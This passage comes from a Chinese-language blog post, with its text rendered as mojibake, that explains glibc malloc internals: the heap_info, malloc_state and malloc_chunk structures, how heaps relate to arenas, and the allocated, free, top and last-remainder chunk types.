ä¼šåŒ…å«å¤šä¸ª <strong>heap</strong> å‘¢ï¼Ÿåœ¨å½“å‰ <strong>heap</strong> ä¸å¤Ÿç”¨çš„æ—¶å€™ï¼Œ<code>malloc</code> ä¼šé€šè¿‡ç³»ç»Ÿè°ƒç”¨ <code>mmap</code> ç”³è¯·æ–°çš„ <strong>heap</strong>ï¼ˆè¿™éƒ¨åˆ†ç©ºé—´æœ¬æ¥æ˜¯ä½äºå†…å­˜æ˜ å°„åŒºåŒºåŸŸï¼‰ï¼Œæ–°çš„ <strong>heap</strong> ä¼šè¢«æ·»åŠ åˆ°å½“å‰ <strong>thread arena</strong> ä¸­ï¼Œä¾¿äºç®¡ç†ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr;                <span class="comment">/* arena for this heap. */</span> <span class="comment">/*è¿™å †çš„ç«æŠ€åœºã€‚*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span>      <span class="comment">/* Previous heap. */</span> <span class="comment">/*ä»¥å‰çš„å †ã€‚*/</span></span><br><span class="line">  <span class="keyword">size_t</span> size;                  <span class="comment">/* Current size in bytes. */</span> <span class="comment">/*å½“å‰å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ã€‚*/</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size;         <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                                   PROT_READ|PROT_WRITE.  */</span> <span class="comment">/*ä»¥mprotectatedçš„å­—èŠ‚çš„å¤§å°*/</span></span><br><span class="line">   <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">      that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">      MALLOC_ALIGNMENT. */</span> <span class="comment">/*ç¡®ä¿ä»¥ä¸‹æ•°æ®æ­£ç¡®å¯¹é½*/</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> ç”¨äºè¡¨ç¤º <strong>arena</strong> çš„ä¿¡æ¯ï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä¸º <strong>arena header</strong>ï¼Œæ¯ä¸ªçº¿ç¨‹åªå«æœ‰ä¸€ä¸ª <strong>arena header</strong>ã€‚<strong>arena header</strong> åŒ…å« <strong>bin</strong>ã€<strong>top chunk</strong> ä»¥åŠ <strong>last remainder chunk</strong> ç­‰ä¿¡æ¯ï¼Œè¿™äº›æ¦‚å¿µä¼šåœ¨åæ–‡è¯¦ç»†ä»‹ç»ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span> <span class="comment">/*åºåˆ—åŒ–è®¿é—®ã€‚*/</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span> <span class="comment">/*æ ‡å¿—ï¼ˆä»¥å‰åœ¨max_fastï¼‰ã€‚*/</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span> <span class="comment">/*å¿«é€Ÿçš„bins*/</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span>  <span class="comment">/*æœ€é¡¶å±‚å—çš„åŸºç¡€ - æ²¡æœ‰ä»¥å…¶ä»–æ–¹å¼ä¿å­˜åœ¨åƒåœ¾ç®±é‡Œ*/</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span> <span class="comment">/*å‰©ä½™çš„æ¥è‡ªå°å‹è¯·æ±‚çš„æœ€æ–°åˆ†è£‚*/</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span> <span class="comment">/*å¦‚ä¸Šæ‰€è¿°åŒ…è£…æ­£å¸¸ç®±*/</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span> <span class="comment">/*binsçš„ä½å›¾*/</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span> <span class="comment">/*é“¾æ¥åå•*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span> <span class="comment">/*å…è´¹ç«æŠ€åœºçš„é“¾è¡¨ã€‚*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span> <span class="comment">/*åœ¨æ­¤ç«æŠ€åœºä¸­åˆ†é…çš„å†…å­˜ã€‚*/</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>ä¸ºäº†ä¾¿äºç®¡ç†å’Œæ›´åŠ é«˜æ•ˆçš„åˆ©ç”¨å†…å­˜ï¼Œä¸€ä¸ª <strong>heap</strong> è¢«åˆ†ä¸ºå¤šä¸ª <strong>chunk</strong>ï¼Œæ¯ä¸ª <strong>chunk</strong> çš„å¤§å°ä¸æ˜¯å›ºå®šï¼Œæ˜¯æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚å†³å®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨æˆ·è°ƒç”¨ <code>malloc(size_t size)</code> ä¼ é€’çš„ <code>size</code> å‚æ•°å°±æ˜¯ <strong>chunk</strong> çš„å¤§å°ï¼ˆè¿™ç§è¡¨ç¤ºå¹¶ä¸å‡†ç¡®ï¼Œä½†æ˜¯ä¸ºäº†æ–¹ä¾¿ç†è§£å°±æš‚æ—¶è¿™ä¹ˆæè¿°äº†ï¼Œè¯¦ç»†è¯´æ˜è§åæ–‡ï¼‰ã€‚æ¯ä¸ª <strong>chunk</strong> éƒ½ç”±ä¸€ä¸ªç»“æ„ä½“ <code>malloc_chunk</code> è¡¨ç¤ºï¼Œä¹Ÿæˆä¸º <strong>chunk header</strong>ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span> <span class="comment">/*ä¹‹å‰å—çš„å¤§å°*/</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span> <span class="comment">/*å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ï¼ŒåŒ…æ‹¬å¼€é”€*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. è¿™ä¸¤ä¸ªæŒ‡é’ˆåªåœ¨free chunkä¸­å­˜åœ¨*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="comment">/*ä»…ç”¨äºå¤§å—ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªæ›´å¤§çš„å°ºå¯¸*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…³äºä¸Šè¿°çš„ä¸‰ç§ç»“æ„ï¼ŒåŸºæœ¬éƒ½æ˜¯é’ˆå¯¹å­çº¿ç¨‹çš„ï¼Œä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹æœ‰ä¸€äº›ä¸åŒï¼š</p><ol><li>ä¸»çº¿ç¨‹çš„å †ä¸æ˜¯åˆ†é…åœ¨å†…å­˜æ˜ å°„åŒºï¼Œè€Œæ˜¯è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜å †åŒºï¼Œå› æ­¤ä¸å«æœ‰å¤šä¸ª <strong>heap</strong> æ‰€ä»¥ä¹Ÿå°±ä¸å«æœ‰ <code>heap_info</code> ç»“æ„ä½“ã€‚å½“éœ€è¦æ›´å¤šå †ç©ºé—´çš„æ—¶å€™ï¼Œç›´æ¥é€šè¿‡å¢é•¿ <code>brk</code> æŒ‡é’ˆæ¥è·å–æ›´å¤šçš„ç©ºé—´ï¼Œç›´åˆ°å®ƒç¢°åˆ°å†…å­˜æ˜ å°„åŒºåŸŸä¸ºæ­¢ã€‚</li><li>ä¸åŒäº <strong>thread arena</strong>ï¼Œä¸»çº¿ç¨‹çš„ <strong>main arena</strong> çš„ <strong>arena header</strong> å¹¶ä¸åœ¨å †åŒºä¸­ï¼Œè€Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå› æ­¤å®ƒå±äº <code>libc.so</code> çš„ data segment åŒºåŸŸã€‚</li><li><strong>heap</strong>çš„ç»“æ„ä½“<code>heap_info</code>ï¼Œ<strong>arena</strong>çš„ç»“æ„ä½“<code>malloc_state</code>ï¼Œ<strong>chunk</strong>çš„ç»“æ„ä½“<code>malloc_chunk</code></li></ol><h2 id="heap-ä¸-arena-çš„å…³ç³»"><a href="#heap-ä¸-arena-çš„å…³ç³»" class="headerlink" title="heap ä¸ arena çš„å…³ç³»"></a>heap ä¸ arena çš„å…³ç³»</h2><p>é¦–å…ˆï¼Œé€šè¿‡å†…å­˜åˆ†å¸ƒå›¾ç†æ¸… <code>malloc_state</code> ä¸ <code>heap_info</code> ä¹‹é—´çš„ç»„ç»‡å…³ç³»ã€‚ä¸‹å›¾æ˜¯åªæœ‰ä¸€ä¸ª <strong>heap</strong> çš„ <strong>main arena</strong> å’Œ <strong>thread arena</strong> çš„å†…å­˜åˆ†å¸ƒå›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/8.png" alt="single heap"></p><p>ä¸‹å›¾æ˜¯ä¸€ä¸ª <strong>thread arena</strong> ä¸­å«æœ‰å¤šä¸ª <strong>heap</strong> çš„æƒ…å†µï¼š</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/9.png" alt="multi-heap"></p><p>ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œ<strong>thread arena</strong> åªå«æœ‰ä¸€ä¸ª <code>malloc_state</code>ï¼ˆå³ <strong>arena header</strong>ï¼‰ï¼Œå´æœ‰ä¸¤ä¸ª <code>heap_info</code>ï¼ˆå³ <strong>heap header</strong>ï¼‰ã€‚ç”±äºä¸¤ä¸ª <strong>heap</strong> æ˜¯é€šè¿‡ <code>mmap</code> ä»æ“ä½œç³»ç»Ÿç”³è¯·çš„å†…å­˜ï¼Œä¸¤è€…åœ¨å†…å­˜å¸ƒå±€ä¸Šå¹¶ä¸ç›¸é‚»è€Œæ˜¯åˆ†å±äºä¸åŒçš„å†…å­˜åŒºé—´ï¼Œæ‰€ä»¥ä¸ºäº†ä¾¿äºç®¡ç†ï¼Œ<code>glibc</code> çš„ <code>malloc</code> å°†ç¬¬äºŒä¸ª <code>heap_info</code> ç»“æ„ä½“çš„ <code>prev</code> æˆå‘˜æŒ‡å‘äº†ç¬¬ä¸€ä¸ª <code>heap_info</code> ç»“æ„ä½“çš„èµ·å§‹ä½ç½®ï¼ˆå³ <code>ar_ptr</code> æˆå‘˜ï¼‰ï¼Œè€Œç¬¬ä¸€ä¸ª <code>heap_info</code> ç»“æ„ä½“çš„ <code>ar_ptr</code> æˆå‘˜æŒ‡å‘äº† <code>malloc_state</code>ï¼Œè¿™æ ·å°±æ„æˆäº†ä¸€ä¸ªå•é“¾è¡¨ï¼Œæ–¹ä¾¿åç»­ç®¡ç†ã€‚</p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><h3 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>åœ¨ <code>glibc</code> çš„ <code>malloc</code> ä¸­å°†æ•´ä¸ªå †å†…å­˜ç©ºé—´åˆ†æˆäº†è¿ç»­çš„ã€å¤§å°ä¸ä¸€çš„ <strong>chunk</strong>ï¼Œå³å¯¹äºå †å†…å­˜ç®¡ç†è€Œè¨€ <strong>chunk</strong> å°±æ˜¯æœ€å°æ“ä½œå•ä½ã€‚<strong>chunk</strong> æ€»å…±åˆ†ä¸º4ç±»ï¼š</p><ul><li>allocated chunk</li><li>free chunk</li><li>top chunk</li><li>last remainder chunk</li></ul><p>æ‰€æœ‰ç±»å‹çš„ <strong>chunk</strong> éƒ½æ˜¯å†…å­˜ä¸­ä¸€å—è¿ç»­çš„åŒºåŸŸï¼Œåªæ˜¯é€šè¿‡è¯¥åŒºåŸŸä¸­ç‰¹å®šä½ç½®çš„æŸäº›æ ‡è¯†ç¬¦åŠ ä»¥åŒºåˆ†ã€‚</p><h3 id="åˆå¹¶è¿‡ç¨‹"><a href="#åˆå¹¶è¿‡ç¨‹" class="headerlink" title="åˆå¹¶è¿‡ç¨‹"></a>åˆå¹¶è¿‡ç¨‹</h3><p>å½“ä¸€ä¸ªé<strong>fast bin</strong>çš„<strong>chunk</strong>è¢«é‡Šæ”¾æ—¶ï¼Œä¼šä¸ç›¸é‚»çš„<strong>chunk</strong>è¿›è¡Œåˆå¹¶ï¼Œé¡ºåºé€šå¸¸æ˜¯å…ˆå‘åï¼ˆä¸Šï¼‰åˆå¹¶å†å‘å‰ï¼ˆä¸‹ï¼‰åˆå¹¶ã€‚å¦‚æœå‘å‰åˆå¹¶çš„<strong>chunk</strong>æ˜¯<strong>top chunk</strong>åˆ™åˆå¹¶ä¹‹åä¼šå½¢æˆæ–°çš„<strong>top chunk</strong>ï¼›å¦‚æœä¸æ˜¯çš„è¯ï¼Œåˆ™åˆå¹¶ä¹‹åä¼šè¢«åŠ å…¥<strong>unsorted bin</strong>ä¸­</p><h3 id="æ‹†åˆ†è¿‡ç¨‹"><a href="#æ‹†åˆ†è¿‡ç¨‹" class="headerlink" title="æ‹†åˆ†è¿‡ç¨‹"></a>æ‹†åˆ†è¿‡ç¨‹</h3><p>å½“ç”¨æˆ·ç”³è¯·çš„<strong>chunk</strong>è¾ƒå°æ—¶ï¼Œä¼šå…ˆå°†ä¸€ä¸ªå¤§çš„<strong>chunk</strong>è¿›è¡Œæ‹†åˆ†ï¼Œåˆé€‚çš„éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ï¼ˆç§°ä¸º<strong>remainder</strong>ï¼‰åˆ™åŠ å…¥<strong>unsorted bin</strong>ä¸­ã€‚åŒæ—¶<code>malloc_state</code>ä¸­çš„<code>last_remainder</code>ä¼šè®°å½•æœ€è¿‘æ‹†åˆ†å‡ºçš„<strong>remainder</strong>ã€‚å½“ç„¶ï¼Œè¿™ä¸ª<strong>remainder</strong>çš„å¤§å°è‡³å°‘è¦ä¸ºMINSIZEï¼Œå¦åˆ™ä¸èƒ½æ‹†åˆ†ã€‚</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>é¡¾åæ€ä¹‰å°±æ˜¯å·²ç»è¢«åˆ†é…ä½¿ç”¨çš„ <strong>chunk</strong> ï¼ŒåŒºåŸŸå†…å®¹è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><ul><li><code>prev_size</code>: å¦‚æœå‰ä¸€ä¸ª <strong>chunk</strong> æ˜¯ <strong>free chunk</strong>ï¼Œåˆ™è¿™ä¸ªå†…å®¹ä¿å­˜çš„æ˜¯å‰ä¸€ä¸ª <strong>chunk</strong> çš„å¤§å°. å¦‚æœå‰ä¸€ä¸ª <strong>chunk</strong> æ˜¯ <strong>allocated chunk</strong>ï¼Œåˆ™è¿™ä¸ªåŒºåŸŸä¿å­˜çš„æ˜¯å‰ä¸€ä¸ª <strong>chunk</strong> çš„ç”¨æˆ·æ•°æ®ï¼ˆä¸€éƒ¨åˆ†è€Œå·²ï¼Œä¸»è¦æ˜¯ä¸ºäº†èƒ½å¤Ÿå……åˆ†åˆ©ç”¨è¿™å—å†…å­˜ç©ºé—´ï¼‰ã€‚</li><li><code>size</code>: ä¿å­˜çš„æ˜¯å½“å‰è¿™ä¸ªchunkçš„å¤§å°ã€‚æ€»å…±æ˜¯ 32 ä½ï¼Œå¹¶ä¸”æœ€åçš„ 3 ä½ä½œä¸ºæ ‡å¿—ä½ï¼š<ul><li><code>PREV_INUSE (P)</code>: è¡¨ç¤ºå‰ä¸€ä¸ª <strong>chunk</strong> æ˜¯å¦ä¸º <strong>allocated chunk</strong>ï¼Œè€Œå½“å‰æ˜¯ä¸æ˜¯ <strong>chunk allocated</strong> å¯ä»¥é€šè¿‡æŸ¥è¯¢ä¸‹ä¸€ä¸ª <strong>chunk</strong> çš„è¿™ä¸ªæ ‡å¿—ä½æ¥å¾—çŸ¥ï¼‰</li><li><code>IS_MMAPPED (M)</code>: è¡¨ç¤ºå½“å‰ <strong>chunk</strong> æ˜¯å¦æ˜¯é€šè¿‡ <code>mmap</code> ç³»ç»Ÿè°ƒç”¨äº§ç”Ÿçš„ï¼Œå­çº¿ç¨‹æ˜¯ <code>mmap</code>ï¼Œä¸»çº¿ç¨‹åˆ™æ˜¯é€šè¿‡ <code>brk</code>ã€‚</li><li><code>NON_MAIN_arena (N)</code>: è¡¨ç¤ºå½“å‰ <strong>chunk</strong> æ˜¯å¦å±äº <strong>main arena</strong>ï¼Œä¹Ÿå°±æ˜¯ä¸»çº¿ç¨‹çš„ <strong>arena</strong>ã€‚ï¼ˆä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„å †åŒºä¸ä¸€æ ·ï¼Œå‰æ–‡å·²ç»åšäº†è¯¦ç»†è¯´æ˜ï¼‰ã€‚</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/10.png" alt="allocated chunk"></p><p>å‡ ä¸ªæ³¨æ„ç‚¹ï¼š</p><ol><li>æ¯ä¸ª <strong>chunk</strong> çš„å¤§å°æ€ä¹ˆç¡®å®šï¼Ÿ<br>ç”¨æˆ·ç¨‹åºè°ƒç”¨ <code>malloc(size_t size)</code> å°±ä¼šåˆ›å»ºä¸€ä¸ª<strong>chunk</strong>ï¼Œä¼ å…¥çš„å¤§å°å°±æ˜¯å½“å‰åˆ†é…çš„ <strong>chunk</strong> å¤§å°ï¼Œè¿™ä¸ªæ˜¯éå¸¸é‡è¦çš„ã€‚</li><li>æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦çŸ¥é“å‰ä¸€ä¸ª <strong>chunk</strong> çš„ä¿¡æ¯ï¼Ÿ<br>ä¸ºäº†æ–¹ä¾¿åˆå¹¶ä¸åŒçš„ <strong>chunk</strong> ï¼Œå‡å°‘å†…å­˜çš„ç¢ç‰‡åŒ–ã€‚å¦‚æœä¸è¿™ä¹ˆåšï¼Œ <strong>chunk</strong> çš„åˆå¹¶åªèƒ½å‘ä¸‹åˆå¹¶ï¼Œå¿…é¡»ä»å¤´éå†æ•´ä¸ªå †ï¼Œç„¶ååŠ ä»¥åˆå¹¶ï¼Œè¿™å°±æ„å‘³ç€æ¯æ¬¡è¿›è¡Œ <strong>chunk</strong> é‡Šæ”¾æ“ä½œæ¶ˆè€—çš„æ—¶é—´ä¸å †çš„å¤§å°æˆçº¿æ€§å…³ç³»ã€‚</li><li><strong>chunk</strong> çš„é“¾è¡¨æ˜¯å¦‚ä½•æ„æˆçš„<br><strong>chunk</strong> åœ¨å †å†…å­˜ä¸Šæ˜¯è¿ç»­çš„ï¼Œå¹¶ä¸æ˜¯ç›´æ¥ç”±æŒ‡é’ˆæ„æˆçš„é“¾è¡¨ï¼Œè€Œæ˜¯é€šè¿‡ <code>prev_size</code> å’Œ <code>size</code> å—æ„æˆäº†éšå¼çš„é“¾è¡¨ã€‚åœ¨è¿›è¡Œåˆ†é…æ“ä½œçš„æ—¶å€™ï¼Œå †å†…å­˜ç®¡ç†å™¨å¯ä»¥é€šè¿‡éå†æ•´ä¸ªå †å†…å­˜çš„ <strong>chunk</strong> ï¼Œåˆ†ææ¯ä¸ª <strong>chunk</strong> çš„ <code>size</code> å­—æ®µï¼Œè¿›è€Œæ‰¾åˆ°åˆé€‚çš„ <strong>chunk</strong>ã€‚</li></ol><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><ul><li><code>prev_size</code>: ä¸ºäº†é˜²æ­¢ç¢ç‰‡åŒ–ï¼Œå †ä¸­ä¸å­˜åœ¨ä¸¤ä¸ªç›¸é‚»çš„ <strong>free chunk</strong> ï¼ˆå¦‚æœå­˜åœ¨ï¼Œåˆ™è¢«å †ç®¡ç†å™¨åˆå¹¶äº†ï¼‰ã€‚å› æ­¤å¯¹äºä¸€ä¸ª <strong>free chunk</strong> ï¼Œè¿™ä¸ª <code>prev_size</code> åŒºåŸŸä¸­ä¸€å®šåŒ…å«çš„ä¸Šä¸€ä¸ª <strong>chunk</strong> çš„éƒ¨åˆ†æœ‰æ•ˆæ•°æ®æˆ–è€…ä¸ºäº†åœ°å€å¯¹é½æ‰€åšçš„å¡«å……å¯¹é½ã€‚</li><li><code>size</code>: åŒ <strong>allocated chunk</strong> ï¼Œè¡¨ç¤ºå½“å‰ <strong>chunk</strong> çš„å¤§å°ï¼Œå…¶æ ‡å¿—ä½<code>N</code>ï¼Œ<code>M</code>ï¼Œ<code>P</code> ä¹ŸåŒ <strong>allocated chunk</strong> ä¸€æ ·ã€‚</li><li><code>fd</code>: å‰å‘æŒ‡é’ˆâ€”â€”æŒ‡å‘å½“å‰ <strong>chunk</strong> åœ¨åŒä¸€ä¸ª <strong>bin</strong>ï¼ˆä¸€ç§ç”¨äºåŠ å¿«å†…å­˜åˆ†é…å’Œé‡Šæ”¾æ•ˆç‡çš„æ˜¾ç¤ºé“¾è¡¨ï¼‰çš„ä¸‹ä¸€ä¸ªï¼ˆçº¿æ€§ä¸­çš„å‰ä¸€ä¸ªï¼‰ <strong>chunk</strong></li><li><code>bk</code>: åå‘æŒ‡é’ˆâ€”â€”æŒ‡å‘å½“å‰ <strong>chunk</strong> åœ¨åŒä¸€ä¸ª <strong>bin</strong> çš„ä¸Šä¸€ä¸ªï¼ˆçº¿æ€§ä¸­çš„åä¸€ä¸ªï¼‰ <strong>chunk</strong></li></ul><p><img src="https://raw.githubusercontent.com/Ascotbe/Random-img/master/HeapOverflow/11.png" alt="free chunk"></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>å½“ä¸€ä¸ª <strong>chunk</strong> å¤„äºä¸€ä¸ª<strong>arena</strong>çš„æœ€é¡¶éƒ¨ï¼ˆå³æœ€é«˜å†…å­˜åœ°å€å¤„ï¼‰çš„æ—¶å€™ï¼Œå°±ç§°ä¹‹ä¸º <strong>top chunk</strong>ã€‚è¯¥ <strong>chunk</strong> å¹¶ä¸å±äºä»»ä½• <strong>bin</strong> ï¼Œè€Œæ˜¯åœ¨å½“å‰çš„ <strong>heap</strong> æ‰€æœ‰çš„ <strong>free chunk</strong> ï¼ˆæ— è®ºé‚£ç§ <strong>bin</strong>ï¼‰éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤ <strong>chunk</strong> å½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨ã€‚å¦‚æœ <strong>top chunk</strong> çš„å¤§å°æ¯”ç”¨æˆ·è¯·æ±‚çš„å¤§å°è¦å¤§çš„è¯ï¼Œå°±å°†è¯¥ <strong>top chunk</strong> åˆ†ä½œä¸¤éƒ¨åˆ†ï¼šç”¨æˆ·è¯·æ±‚çš„ <strong>chunk</strong> å’Œå‰©ä½™çš„éƒ¨åˆ†ï¼ˆæˆä¸ºæ–°çš„ <strong>top chunk</strong>ï¼‰ã€‚å¦åˆ™ï¼Œå°±éœ€è¦æ‰©å±• <strong>heap</strong> æˆ–åˆ†é…æ–°çš„ <strong>heap</strong> äº†ï¼Œåœ¨ <strong>main arena</strong> ä¸­é€šè¿‡ <code>sbrk</code> æ‰©å±• <strong>heap</strong>ï¼Œè€Œåœ¨<strong>thread arena</strong> ä¸­é€šè¿‡ <code>mmap</code> åˆ†é…æ–°çš„ <strong>heap</strong>ã€‚æ³¨æ„ï¼Œè‡³æ­¤æˆ‘ä»¬å·²ç»å¤šæ¬¡å¼ºè°ƒï¼Œä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„å †ç®¡ç†æ–¹å¼çš„å·®å¼‚ã€‚</p><h3 id="last-remainder-chunk"><a href="#last-remainder-chunk" class="headerlink" title="last remainder chunk"></a>last remainder chunk</h3><p>å®ƒæ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼šå½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ª <strong>small chunk</strong>ï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢« <strong>small bin</strong>ã€<strong>unsorted bin</strong> æ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡ <code>binmaps</code> éå† <strong>bin</strong> æŸ¥æ‰¾æœ€åˆé€‚çš„ <strong>chunk</strong> ï¼Œå¦‚æœè¯¥ <strong>chunk</strong> æœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„ <strong>chunk</strong> åŠ å…¥åˆ° <strong>unsorted bin</strong> ä¸­ï¼Œå¦å¤–ï¼Œå†å°†è¯¥æ–°çš„ <strong>chunk</strong> å˜æˆæ–°çš„ <strong>last remainder chunk</strong> ã€‚</p><p>å®ƒçš„ä½œç”¨æ˜¯ï¼šæ­¤ç±»å‹çš„ <strong>chunk</strong> ç”¨äºæé«˜è¿ç»­ <code>malloc</code>ï¼ˆäº§ç”Ÿå¤§é‡ <strong>small chunk</strong>ï¼‰çš„æ•ˆç‡ï¼Œä¸»è¦æ˜¯æé«˜å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ã€‚é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆæé«˜å±€éƒ¨æ€§çš„å‘¢ï¼Ÿä¸¾ä¾‹è¯´æ˜ã€‚å½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ª <strong>small chunk</strong> ï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢« <strong>small bin</strong> æ»¡è¶³ï¼Œé‚£ä¹ˆå°±è½¬è€Œäº¤ç”± <strong>unsorted bin</strong> 